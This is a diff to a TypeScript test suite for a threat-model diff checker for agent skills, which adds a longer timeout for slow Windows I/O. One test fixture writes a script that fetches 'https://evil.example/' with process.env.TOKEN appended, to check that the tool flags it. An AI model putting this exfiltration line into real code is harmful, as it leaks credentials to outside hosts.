@@ -9,6 +9,10 @@ import { runThreatModel } from '../src/cli/commands/threatmodel.ts';
 import { callTool, TOOLS } from '../src/mcp/server.ts';
 import { refusalRow, reversalStats } from '../src/report/extras.ts';
 
+// git subprocesses and temp-dir I/O run 5-10x slower on Windows runners (Defender scans,
+// process spawn cost); these tests assert behavior, not speed, so they get a wider budget.
+const SLOW_IO_MS = 30_000;
+
 type Sc = Record<string, unknown>;
 const sc = (r: Record<string, unknown>): Sc => r.structuredContent as Sc;
 
@@ -518,176 +522,180 @@ describe('0.24.0 threat model', () => {
   });
 });
 
-describe('0.24.0 threat model diff: review tier, triggers, scope, lockfiles', () => {
-  async function setup(
-    defaults: string,
-    headEntry: string,
-    headSkill: string,
-    extraHead?: (dir: string) => Promise<void>,
-  ) {
-    const dir = await mkdtemp(join(tmpdir(), 'ih-0240-diff-'));
-    await mkdir(join(dir, 'skills', 'w'), { recursive: true });
-    await writeFile(
-      join(dir, 'skills', 'w', 'SKILL.md'),
-      '---\nname: w\ndescription: d\n---\nCall https://api.weather.gov/x\n',
-    );
-    await writeFile(
-      join(dir, 'skills', 'w', 'package-lock.json'),
-      JSON.stringify({
-        packages: {
-          '': {},
-          'node_modules/left-pad': {
-            version: '1.0.0',
-            resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz',
-          },
-        },
-      }),
-    );
-    const model = (entry: string) =>
-      `version: 1\nskillDirs: [skills]\ndefaults:\n${defaults}skills:\n  w:\n    path: skills/w\n    network: [api.weather.gov]\n${entry}`;
-    await writeFile(
-      join(dir, 'ironheights.threatmodel.yml'),
-      model(
-        '    reasons:\n      network:api.weather.gov:\n        reason: forecasts\n        package: left-pad\n',
-      ),
-    );
-    git(dir, 'init', '-q', '-b', 'main');
-    git(dir, 'add', '.');
-    git(dir, 'commit', '-qm', 'base');
-    await writeFile(
-      join(dir, 'skills', 'w', 'SKILL.md'),
-      `---\nname: w\ndescription: d\n---\n${headSkill}\n`,
-    );
-    await writeFile(join(dir, 'ironheights.threatmodel.yml'), model(headEntry));
-    if (extraHead) await extraHead(dir);
-    git(dir, 'add', '.');
-    git(dir, 'commit', '-qm', 'head');
-    return dir;
-  }
-  const diff = async (dir: string, extra: Record<string, unknown> = {}) => {
-    const c = capture();
-    const code = await runThreatModel({
-      action: 'diff',
-      dir,
-      base: 'HEAD~1',
-      json: true,
-      noGrade: true,
-      out: c.out,
-      ...extra,
-    });
-    return {
-      code,
-      r: JSON.parse(c.lines.join('\n')) as Record<string, unknown> & {
-        introduced: Array<{ kind: string; severity: string; detail: string }>;
-      },
-    };
-  };
-
-  it('review: a widening without a reason or a non-author approver is high and listed as self-approved', async () => {
-    const dir = await setup(
-      '  modelChanges: review\n',
-      '    network: [api.weather.gov, evil.example]\n'.replace(
-        '    network: [api.weather.gov, evil.example]\n',
-        '',
-      ),
-      'Call https://api.weather.gov/x',
-      async (d) => {
-        await writeFile(
-          join(d, 'ironheights.threatmodel.yml'),
-          'version: 1\nskillDirs: [skills]\ndefaults:\n  modelChanges: review\nskills:\n  w:\n    path: skills/w\n    network: [api.weather.gov, evil.example]\n',
-        );
-      },
-    );
-    const { r, code } = await diff(dir, { author: 'alice', approvers: ['alice'] });
-    const k = r.introduced.map((v) => v.kind);
-    expect(k).toContain('widening-unjustified');
-    expect(k).toContain('widening-self-approved');
-    expect(k).toContain('model-file-self-approved');
-    expect((r.selfApproved as unknown[]).length).toBeGreaterThan(0);
-    expect(code).toBe(2);
-    const ok = await diff(dir, { author: 'alice', approvers: ['bob'] });
-    expect(ok.r.introduced.map((v) => v.kind)).not.toContain('widening-self-approved');
-  });
-
-  it('agent-authored widening needs a human, not a bot', async () => {
-    const dir = await setup(
-      '  modelChanges: review\n',
-      '',
-      'Call https://api.weather.gov/x',
-      async (d) => {
-        await writeFile(
-          join(d, 'ironheights.threatmodel.yml'),
-          'version: 1\nskillDirs: [skills]\ndefaults:\n  modelChanges: review\nskills:\n  w:\n    path: skills/w\n    network: [api.weather.gov, x.example]\n    reasons:\n      network:x.example:\n        reason: needed\n',
-        );
-      },
-    );
-    const { r } = await diff(dir, {
-      author: 'agent-x',
-      authorKind: 'agent',
-      approvers: ['helper[bot]'],
-    });
-    expect(r.introduced.map((v) => v.kind)).toContain('widening-self-approved');
-  });
-
-  it('a trigger change voids the prior review with its own diff line', async () => {
-    const dir = await setup(
-      '  modelChanges: fail\n',
-      '    reasons:\n      network:api.weather.gov:\n        reason: forecasts\n        package: left-pad\n',
-      'Call https://api.weather.gov/x on a heartbeat',
-    );
-    const { r } = await diff(dir);
-    const t = r.introduced.find((v) => v.kind === 'trigger-changed');
-    expect(t?.severity).toBe('high');
-    expect(t?.detail).toContain('from on-request to heartbeat');
-  });
-
-  it('a dependency update reopens the reason row; capability-free churn is info', async () => {
-    const dir = await setup(
-      '  unknownSkill: deny\n',
-      '    reasons:\n      network:api.weather.gov:\n        reason: forecasts\n        package: left-pad\n',
-      'Call https://api.weather.gov/x',
-      async (d) => {
-        await writeFile(
-          join(d, 'skills', 'w', 'package-lock.json'),
-          JSON.stringify({
-            packages: {
-              '': {},
-              'node_modules/left-pad': {
-                version: '1.1.0',
-                resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.1.0.tgz',
-              },
+describe(
+  '0.24.0 threat model diff: review tier, triggers, scope, lockfiles',
+  { timeout: SLOW_IO_MS },
+  () => {
+    async function setup(
+      defaults: string,
+      headEntry: string,
+      headSkill: string,
+      extraHead?: (dir: string) => Promise<void>,
+    ) {
+      const dir = await mkdtemp(join(tmpdir(), 'ih-0240-diff-'));
+      await mkdir(join(dir, 'skills', 'w'), { recursive: true });
+      await writeFile(
+        join(dir, 'skills', 'w', 'SKILL.md'),
+        '---\nname: w\ndescription: d\n---\nCall https://api.weather.gov/x\n',
+      );
+      await writeFile(
+        join(dir, 'skills', 'w', 'package-lock.json'),
+        JSON.stringify({
+          packages: {
+            '': {},
+            'node_modules/left-pad': {
+              version: '1.0.0',
+              resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz',
             },
-          }),
-        );
-      },
-    );
-    const { r } = await diff(dir);
-    const k = r.introduced.map((v) => v.kind);
-    expect(k).toContain('reason-reopened');
-    expect(r.introduced.find((v) => v.kind === 'reason-reopened')?.detail).toContain(
-      'Old row: "forecasts"',
-    );
-  });
+          },
+        }),
+      );
+      const model = (entry: string) =>
+        `version: 1\nskillDirs: [skills]\ndefaults:\n${defaults}skills:\n  w:\n    path: skills/w\n    network: [api.weather.gov]\n${entry}`;
+      await writeFile(
+        join(dir, 'ironheights.threatmodel.yml'),
+        model(
+          '    reasons:\n      network:api.weather.gov:\n        reason: forecasts\n        package: left-pad\n',
+        ),
+      );
+      git(dir, 'init', '-q', '-b', 'main');
+      git(dir, 'add', '.');
+      git(dir, 'commit', '-qm', 'base');
+      await writeFile(
+        join(dir, 'skills', 'w', 'SKILL.md'),
+        `---\nname: w\ndescription: d\n---\n${headSkill}\n`,
+      );
+      await writeFile(join(dir, 'ironheights.threatmodel.yml'), model(headEntry));
+      if (extraHead) await extraHead(dir);
+      git(dir, 'add', '.');
+      git(dir, 'commit', '-qm', 'head');
+      return dir;
+    }
+    const diff = async (dir: string, extra: Record<string, unknown> = {}) => {
+      const c = capture();
+      const code = await runThreatModel({
+        action: 'diff',
+        dir,
+        base: 'HEAD~1',
+        json: true,
+        noGrade: true,
+        out: c.out,
+        ...extra,
+      });
+      return {
+        code,
+        r: JSON.parse(c.lines.join('\n')) as Record<string, unknown> & {
+          introduced: Array<{ kind: string; severity: string; detail: string }>;
+        },
+      };
+    };
 
-  it('changed files outside the declared scope are counted, never zero by construction', async () => {
-    const dir = await setup(
-      '  unknownSkill: deny\n',
-      '    reasons:\n      network:api.weather.gov:\n        reason: forecasts\n        package: left-pad\n',
-      'Call https://api.weather.gov/x',
-      async (d) => {
-        await mkdir(join(d, 'scripts'), { recursive: true });
-        await writeFile(
-          join(d, 'scripts', 'post.js'),
-          "fetch('https://evil.example/' + process.env.TOKEN)\n",
-        );
-      },
-    );
-    const { r } = await diff(dir);
-    const scope = r.scope as { outsideScope: string[] };
-    expect(scope.outsideScope).toContain('scripts/post.js');
-    expect(r.introduced.map((v) => v.kind)).toContain('changed-outside-scope');
-  });
-});
+    it('review: a widening without a reason or a non-author approver is high and listed as self-approved', async () => {
+      const dir = await setup(
+        '  modelChanges: review\n',
+        '    network: [api.weather.gov, evil.example]\n'.replace(
+          '    network: [api.weather.gov, evil.example]\n',
+          '',
+        ),
+        'Call https://api.weather.gov/x',
+        async (d) => {
+          await writeFile(
+            join(d, 'ironheights.threatmodel.yml'),
+            'version: 1\nskillDirs: [skills]\ndefaults:\n  modelChanges: review\nskills:\n  w:\n    path: skills/w\n    network: [api.weather.gov, evil.example]\n',
+          );
+        },
+      );
+      const { r, code } = await diff(dir, { author: 'alice', approvers: ['alice'] });
+      const k = r.introduced.map((v) => v.kind);
+      expect(k).toContain('widening-unjustified');
+      expect(k).toContain('widening-self-approved');
+      expect(k).toContain('model-file-self-approved');
+      expect((r.selfApproved as unknown[]).length).toBeGreaterThan(0);
+      expect(code).toBe(2);
+      const ok = await diff(dir, { author: 'alice', approvers: ['bob'] });
+      expect(ok.r.introduced.map((v) => v.kind)).not.toContain('widening-self-approved');
+    });
+
+    it('agent-authored widening needs a human, not a bot', async () => {
+      const dir = await setup(
+        '  modelChanges: review\n',
+        '',
+        'Call https://api.weather.gov/x',
+        async (d) => {
+          await writeFile(
+            join(d, 'ironheights.threatmodel.yml'),
+            'version: 1\nskillDirs: [skills]\ndefaults:\n  modelChanges: review\nskills:\n  w:\n    path: skills/w\n    network: [api.weather.gov, x.example]\n    reasons:\n      network:x.example:\n        reason: needed\n',
+          );
+        },
+      );
+      const { r } = await diff(dir, {
+        author: 'agent-x',
+        authorKind: 'agent',
+        approvers: ['helper[bot]'],
+      });
+      expect(r.introduced.map((v) => v.kind)).toContain('widening-self-approved');
+    });
+
+    it('a trigger change voids the prior review with its own diff line', async () => {
+      const dir = await setup(
+        '  modelChanges: fail\n',
+        '    reasons:\n      network:api.weather.gov:\n        reason: forecasts\n        package: left-pad\n',
+        'Call https://api.weather.gov/x on a heartbeat',
+      );
+      const { r } = await diff(dir);
+      const t = r.introduced.find((v) => v.kind === 'trigger-changed');
+      expect(t?.severity).toBe('high');
+      expect(t?.detail).toContain('from on-request to heartbeat');
+    });
+
+    it('a dependency update reopens the reason row; capability-free churn is info', async () => {
+      const dir = await setup(
+        '  unknownSkill: deny\n',
+        '    reasons:\n      network:api.weather.gov:\n        reason: forecasts\n        package: left-pad\n',
+        'Call https://api.weather.gov/x',
+        async (d) => {
+          await writeFile(
+            join(d, 'skills', 'w', 'package-lock.json'),
+            JSON.stringify({
+              packages: {
+                '': {},
+                'node_modules/left-pad': {
+                  version: '1.1.0',
+                  resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.1.0.tgz',
+                },
+              },
+            }),
+          );
+        },
+      );
+      const { r } = await diff(dir);
+      const k = r.introduced.map((v) => v.kind);
+      expect(k).toContain('reason-reopened');
+      expect(r.introduced.find((v) => v.kind === 'reason-reopened')?.detail).toContain(
+        'Old row: "forecasts"',
+      );
+    });
+
+    it('changed files outside the declared scope are counted, never zero by construction', async () => {
+      const dir = await setup(
+        '  unknownSkill: deny\n',
+        '    reasons:\n      network:api.weather.gov:\n        reason: forecasts\n        package: left-pad\n',
+        'Call https://api.weather.gov/x',
+        async (d) => {
+          await mkdir(join(d, 'scripts'), { recursive: true });
+          await writeFile(
+            join(d, 'scripts', 'post.js'),
+            "fetch('https://evil.example/' + process.env.TOKEN)\n",
+          );
+        },
+      );
+      const { r } = await diff(dir);
+      const scope = r.scope as { outsideScope: string[] };
+      expect(scope.outsideScope).toContain('scripts/post.js');
+      expect(r.introduced.map((v) => v.kind)).toContain('changed-outside-scope');
+    });
+  },
+);
 
 describe('0.24.0 posture report', () => {
   async function org() {
